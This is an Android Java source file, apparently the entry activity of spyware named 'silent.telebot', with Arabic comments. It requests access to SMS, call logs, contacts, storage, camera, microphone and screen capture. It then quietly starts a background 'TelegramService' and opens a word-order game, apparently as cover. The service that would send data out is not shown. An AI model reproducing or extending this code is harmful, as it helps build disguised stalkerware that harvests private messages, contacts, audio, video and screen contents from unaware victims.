package com.silent.telebot;

import android.Manifest;
import android.app.Activity;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.media.projection.MediaProjectionManager;
import android.os.Build;
import android.os.Bundle;
import android.widget.Toast;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

public class MainActivity extends Activity {
    private static final int REQ_PERMISSIONS = 100;
    private static final int REQ_SCREEN_CAPTURE = 101;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        // طلب الأذونات العادية
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            String[] permissions = {
                    Manifest.permission.READ_SMS,
                    Manifest.permission.READ_CALL_LOG,
                    Manifest.permission.READ_CONTACTS,
                    Manifest.permission.READ_EXTERNAL_STORAGE,
                    Manifest.permission.CAMERA,
                    Manifest.permission.RECORD_AUDIO
            };

            boolean allGranted = true;
            for (String perm : permissions) {
                if (ContextCompat.checkSelfPermission(this, perm) != PackageManager.PERMISSION_GRANTED) {
                    allGranted = false;
                    break;
                }
            }

            if (!allGranted) {
                ActivityCompat.requestPermissions(this, permissions, REQ_PERMISSIONS);
                return;
            }
        }

        // طلب صلاحية تسجيل الشاشة
        requestScreenCapture();
    }

    private void requestScreenCapture() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            MediaProjectionManager projectionManager = (MediaProjectionManager) getSystemService(MEDIA_PROJECTION_SERVICE);
            Intent intent = projectionManager.createScreenCaptureIntent();
            startActivityForResult(intent, REQ_SCREEN_CAPTURE);
        } else {
            startServicesAndFinish();
        }
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        if (requestCode == REQ_SCREEN_CAPTURE) {
            if (resultCode == RESULT_OK && data != null) {
                // 🔥 تخزين بيانات الصلاحية في ScreenCaptureService
                ScreenCaptureService.setResultData(resultCode, data);
                Toast.makeText(this, "✅ صلاحية لقطة الشاشة مفعلة", Toast.LENGTH_SHORT).show();
            } else {
                Toast.makeText(this, "❌ تم رفض صلاحية لقطة الشاشة", Toast.LENGTH_LONG).show();
            }
            startServicesAndFinish();
        }
    }

    private void startServicesAndFinish() {
        // بدء الخدمة الخلفية
        Intent serviceIntent = new Intent(this, TelegramService.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(serviceIntent);
        } else {
            startService(serviceIntent);
        }

        // فتح اللعبة
        Intent gameIntent = new Intent(this, WordOrderActivity.class);
        startActivity(gameIntent);

        finish();
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == REQ_PERMISSIONS) {
            boolean allGranted = true;
            for (int result : grantResults) {
                if (result != PackageManager.PERMISSION_GRANTED) {
                    allGranted = false;
                    break;
                }
            }
            if (allGranted) {
                Toast.makeText(this, "✅ جميع الأذونات ممنوحة", Toast.LENGTH_SHORT).show();
            } else {
                Toast.makeText(this, "⚠️ بعض الأذونات مرفوضة", Toast.LENGTH_LONG).show();
            }
            requestScreenCapture();
        }
    }
} 
